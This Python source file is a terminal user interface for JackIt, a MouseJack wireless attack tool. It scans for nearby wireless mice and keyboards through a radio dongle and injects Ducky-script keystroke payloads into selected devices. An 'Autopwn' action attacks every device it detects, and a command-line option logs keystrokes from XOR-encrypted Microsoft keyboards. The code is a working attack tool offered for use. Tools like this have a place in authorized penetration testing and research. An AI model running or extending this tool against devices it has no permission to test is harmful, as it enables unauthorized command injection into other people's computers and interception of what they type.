#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import asyncio
from typing import Optional

import click

from textual.app import App, ComposeResult
from textual.widgets import Header, Footer, DataTable, Static, DirectoryTree
from textual.containers import Container, VerticalScroll
from textual.screen import ModalScreen
from textual.reactive import reactive

from jackit import duckyparser
from jackit import mousejack


# ==========================================================
# Root Check
# ==========================================================

def confirm_root():
    if hasattr(os, "getuid") and os.getuid() != 0:
        print("Must run as root.")
        sys.exit(1)


# ==========================================================
# File Viewer
# ==========================================================

class FileViewer(ModalScreen[None]):
    CSS = """
        #viewer-header {
            height: 1;
            background: $accent;
            color: $text;
            padding-left: 1;
            text-style: bold;
        }
        DataTable {
            width: 95%;
        }

        #device-summary {
            width: 95%;
        }

        """

    def __init__(self, path: str):
        super().__init__()
        self.path = path

    def compose(self) -> ComposeResult:
        yield Container(
            Static(
                f"Viewing: {self.path} (ESC to close)",
                id="viewer-header"
            ),
            VerticalScroll(
                Static(self.read_file())
            ),
        )

    def read_file(self) -> str:
        try:
            with open(self.path, "r", errors="ignore") as f:
                return f.read()
        except Exception:
            return "[Unable to read file]"

    async def on_key(self, event):
        if event.key == "escape":
            self.dismiss(None)


# ==========================================================
# Payload Browser
# ==========================================================

class PayloadBrowser(ModalScreen[Optional[str]]):

    def __init__(self, start_path="."):
        super().__init__()
        self.start_path = start_path

    def compose(self) -> ComposeResult:
        yield Container(
            Static("Browse Payload Files (ENTER=Select  v=View  ESC=Cancel)"),
            DirectoryTree(self.start_path),
        )

    async def on_directory_tree_file_selected(
        self, event: DirectoryTree.FileSelected
    ):
        self.dismiss(event.path)

    async def on_key(self, event):
        if event.key == "escape":
            self.dismiss(None)

        elif event.key == "v":
            tree = self.query_one(DirectoryTree)
            node = tree.cursor_node

            if node and node.data:
                path = node.data.path
                if path and path.is_file():
                    await self.app.push_screen(FileViewer(str(path)))


# ==========================================================
# Main Application
# ==========================================================

class JackItApp(App):

    CSS = """
    #status {
        height: 1;
        background: $accent;
        color: $text;
        padding-left: 1;
        text-style: bold;
    }

    #device-summary {
        padding-left: 1;
    }
    """

    scanning = reactive(False)
    payload_name = reactive("None")

    BINDINGS = [
        ("q", "quit", "Quit"),
        ("s", "toggle_scan", "Scan"),
        ("p", "select_payload", "Payload"),
        ("v", "view_payload", "View Payload"),
        ("a", "attack_selected", "Attack selected"),
        ("A", "autopwn", "Autopwn"),
    ]

    def __init__(
        self,
        debug=False,
        interval=5,
        duration=5,
        layout="us",
        lowpower=False,
        reset=True,
        address="",
        vendor="",
        autopwn=False,
        all_channels=False,
    ):
        super().__init__()

        self.debug_mode = debug
        self.interval = interval
        self.duration = duration
        self.layout = layout
        self.attack = None
        self.scan_task: Optional[asyncio.Task] = None
        self.next_scan_time: Optional[float] = None
        self.target_address = address
        self.target_vendor = vendor
        self.auto_start_autopwn = autopwn
        self.all_channels = all_channels
        self.payload_path: Optional[str] = None

        try:
            self.jack = mousejack.MouseJack(lowpower, debug, reset)
        except Exception as e:
            print(f"Radio init failed: {e}")
            sys.exit(1)

    # ------------------------------------------------------
    async def action_attack_selected(self):
        if not self.attack:
            self.update_status("No payload loaded")
            return

        table = self.query_one(DataTable)

        if table.cursor_row is None:
            self.update_status("No device selected")
            return

        row_index = table.cursor_row

        devices = list(self.jack.devices.items())

        if row_index >= len(devices):
            self.update_status("Invalid selection")
            return

        addr, device = devices[row_index]

        hid = device.get("device")
        if not hid:
            self.update_status("Device not injectable")
            return

        payload = device["payload"]
        channels = device["channels"]
        address = device["address"]

        self.jack.sniffer_mode(address)
        lock_channel = self.jack.find_channel(address)

        if lock_channel:
            self.jack.attack(hid(address, payload), self.attack)
            self.update_status(f"Attacked {addr}")
        else:
            for ch in channels:
                self.jack.set_channel(ch)
                self.jack.attack(hid(address, payload), self.attack)

            self.update_status(f"Attacked {addr} (all channels)")


    async def action_view_payload(self):
        if not self.payload_path:
            self.update_status("No payload loaded")
            return

        await self.push_screen(FileViewer(self.payload_path))

    def compose(self) -> ComposeResult:
        yield Header()
        yield Static("Idle | Payload: None", id="status")
        yield DataTable(id="devices")
        yield Static("", id="device-summary")
        yield Footer()

    async def on_mount(self):
        table = self.query_one(DataTable)

        col_key = table.add_column("KEY", width=4)
        table.add_column("ADDRESS", width=18)
        table.add_column("CHANNELS", width=9)
        col_count = table.add_column("COUNT", width=7)
        table.add_column("SEEN", width=13)
        table.add_column("TYPE", width=14)
        table.add_column("PACKET")

        col_key.justify = "right"
        col_count.justify = "right"

        self.set_interval(1.0, self.update_countdown)
        if self.attack:
            self.update_status("Payload loaded")

        width = self.size.width
        fancy_line = "─" * (width - 1)

        summary = self.query_one("#device-summary", Static)
        summary.update(f"{fancy_line}\nDevices found: 0")



    # ------------------------------------------------------
    # Countdown
    # ------------------------------------------------------
    async def update_countdown(self):
        if not self.scanning or not self.next_scan_time:
            return

        remaining = self.next_scan_time - time.time()
        if remaining < 0:
            remaining = 0

        status = self.query_one("#status", Static)

        status.update(
            f"SCANNING | RF: {self.duration}s | "
            f"Interval: {self.interval}s | "
            f"Next in: {remaining:.0f}s | "
            f"Payload: {self.payload_name}"
        )

    # ------------------------------------------------------
    # Scanning
    # ------------------------------------------------------

    async def scan_loop(self):
        while self.scanning:

            cycle_start = time.time()

            # Immediate RF scan
            await asyncio.to_thread(self.jack.scan, self.duration)

            self.refresh_table()

            # Schedule next scan time
            elapsed = time.time() - cycle_start
            remaining = self.interval - elapsed

            if remaining > 0:
                self.next_scan_time = time.time() + remaining
                try:
                    await asyncio.sleep(remaining)
                except asyncio.CancelledError:
                    break
            else:
                self.next_scan_time = None


    def refresh_table(self):
        table = self.query_one(DataTable)
        summary = self.query_one("#device-summary", Static)

        table.clear()

        now = time.time()

        total_width = self.size.width
        fixed_width = 4 + 18 + 9 + 7 + 13 + 14 + 7
        available_packet_width = max(10, total_width - fixed_width)

        for idx, (addr, device) in enumerate(self.jack.devices.items(), start=1):

            channels = ",".join(str(c) for c in device.get("channels", []))
            count = device.get("count", 0)

            timestamp = device.get("timestamp", now)
            delta = now - timestamp
            seen = time.strftime("%H:%M:%S", time.gmtime(delta)) + " ago"

            device_type = (
                device["device"].description()
                if device.get("device")
                else "Unknown"
            )

            packet = str(device.get("payload", ""))

            if len(packet) > available_packet_width:
                packet = packet[: available_packet_width - 1] + "…"

            table.add_row(
                str(idx),
                addr,
                channels,
                str(count),
                seen,
                device_type,
                packet,
            )

            width = self.size.width

            fancy_line = "─" * width

            summary.update(
                f"{fancy_line}\nDevices found: {len(self.jack.devices)}"
            )


    async def action_toggle_scan(self):
        self.scanning = not self.scanning

        if self.scanning:
            # Immediately update header
            self.update_status("SCANNING")

            # Start scan loop
            self.scan_task = asyncio.create_task(self.scan_loop())

        else:
            self.next_scan_time = None

            if self.scan_task:
                self.scan_task.cancel()
                self.scan_task = None

            # Immediately update header
            self.update_status("Idle")

    # ------------------------------------------------------
    # Payload
    # ------------------------------------------------------

    async def action_select_payload(self):
        await self.push_screen(
            PayloadBrowser("."), self.on_payload_selected
        )

    async def on_payload_selected(self, path: Optional[str]):
        if path:
            self.load_payload(path)

    def load_payload(self, path, update_ui=True):
        try:
            with open(path, "r") as f:
                parser = duckyparser.DuckyParser(
                    f.read(), layout=self.layout
                )
                self.attack = parser.parse()
                self.payload_name = os.path.basename(path)
                self.payload_path = path

                if update_ui:
                    self.update_status("Payload loaded")

        except Exception:
            if update_ui:
                self.update_status("Payload load failed")



    async def action_autopwn(self):
        if not self.attack:
            self.update_status("No payload loaded")
            return

        for addr, device in self.jack.devices.items():
            payload = device["payload"]
            channels = device["channels"]
            address = device["address"]
            hid = device["device"]

            if not hid:
                continue

            self.jack.sniffer_mode(address)
            lock_channel = self.jack.find_channel(address)

            if lock_channel:
                self.jack.attack(hid(address, payload), self.attack)
            else:
                for ch in channels:
                    self.jack.set_channel(ch)
                    self.jack.attack(hid(address, payload), self.attack)

        self.update_status("Autopwn completed")

    def update_status(self, message=None):
        status = self.query_one("#status", Static)

        if self.scanning:
            base = f"SCANNING | RF: {self.duration}s | Interval: {self.interval}s"
        else:
            base = f"Idle | RF: {self.duration}s | Interval: {self.interval}s"

        if message:
            base = f"{base} | {message}"

        base += f" | Payload: {self.payload_name}"

        status.update(base)


# ==========================================================
# CLI
# ==========================================================

@click.command()
@click.option("--debug", is_flag=True, help="Enable debug")
@click.option("--script", type=click.Path(), help="Ducky file to use for injection")
@click.option("--lowpower", is_flag=True, help="Disable LNA on CrazyPA")
@click.option("--interval", default=5, type=int, help="Interval of scan in seconds, default to 5s")
@click.option("--duration", default=5, type=int, help="Duration of scan in seconds, default to 5s")
@click.option("--layout", default="us", help="Keyboard layout: us, gb, de...")
@click.option("--address", default="", help="Address of device to target attack")
@click.option("--vendor", default="", help="Vendor of device to target (required when specifying address)")
@click.option("--reset", is_flag=True, help="Reset CrazyPA dongle prior to initialization")
@click.option("--autopwn", is_flag=True, help="Automatically find and attack all targets")
@click.option("--all-channels", is_flag=True, help="Send attack to all detected channels")
@click.option("--keylogging", is_flag=True, help="Log keystrokes for XOR encrypted MS keyboards")
def cli(
    debug,
    script,
    lowpower,
    interval,
    duration,
    layout,
    address,
    vendor,
    reset,
    autopwn,
    all_channels,
    keylogging,
):

    confirm_root()

    if keylogging:
        from jackit import keylogger
        jack = mousejack.MouseJack(lowpower, debug, reset or True)
        k = keylogger.KeyLogger(jack, layout)
        k.scan()
        return

    app = JackItApp(
        debug=debug,
        interval=interval,
        duration=duration,
        layout=layout,
        lowpower=lowpower,
        reset=True,
        address=address,
        vendor=vendor,
        autopwn=autopwn,
        all_channels=all_channels,
    )

    if script:
        app.load_payload(script, update_ui=False)

    app.run()


if __name__ == "__main__":
    cli()

